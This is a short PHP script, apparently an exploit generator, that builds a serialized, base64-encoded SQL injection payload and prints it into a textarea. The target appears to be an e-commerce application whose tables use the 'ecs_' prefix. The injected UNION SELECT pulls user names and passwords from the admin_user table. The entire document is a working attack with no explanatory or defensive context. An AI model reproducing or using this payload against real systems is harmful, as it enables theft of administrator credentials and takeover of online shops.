<?php
$p="ecs_";
$p=isset($_REQUEST['pre'])?$_REQUEST['pre']:$p;
$arr=array("1') and 1=2 GROUP BY goods_id union all select concat(user_name,0x3a,password,'\"\\') union select 1#\"'),1 from ".$p."admin_user#"=>"1"); 
$exp = array("attr"=>$arr);  
$exp = base64_encode(serialize($exp));   
//echo $exp;
?>
<textarea name="textarea" id="textarea" cols="100" rows="5"><?=$exp?></textarea>